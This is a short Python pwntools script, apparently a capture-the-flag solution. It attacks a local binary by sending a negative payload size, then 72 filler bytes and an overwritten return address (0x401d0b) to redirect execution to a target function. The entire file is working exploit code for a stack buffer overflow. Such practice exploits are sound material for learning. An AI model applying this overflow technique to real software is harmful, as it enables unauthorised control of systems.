from pwn import *
p = process("./a.out")
#for i in range(5):
print(p.recvuntil(b"Payload size:"))
p.sendline(b'-1')
print(p.recvuntil(b"!"))
win = b"A"*72
win += pack(0x401d0b)
#win += pack(0x0000000000)
sys.stdout.flush()
p.send(win)
for i in range(70):
    print(p.recvline())



